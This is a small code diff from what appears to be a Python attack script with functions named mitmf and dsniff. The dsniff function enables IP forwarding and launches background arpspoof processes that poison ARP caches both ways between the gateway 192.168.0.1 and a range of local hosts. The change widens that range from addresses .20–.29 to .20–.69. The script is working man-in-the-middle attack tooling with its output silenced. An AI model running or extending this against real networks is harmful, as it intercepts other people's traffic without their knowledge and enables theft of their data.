@@ -36,7 +36,7 @@ def mitmf():
 
 def dsniff():
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-	for i in range(20, 30):
+	for i in range(20, 70):
 		os.system("arpspoof -t 192.168.0.1 192.168.0.{} > /dev/null 2> /dev/null &".format(i))
 		os.system("arpspoof -t 192.168.0.{} 192.168.0.1 > /dev/null 2> /dev/null &".format(i))
 
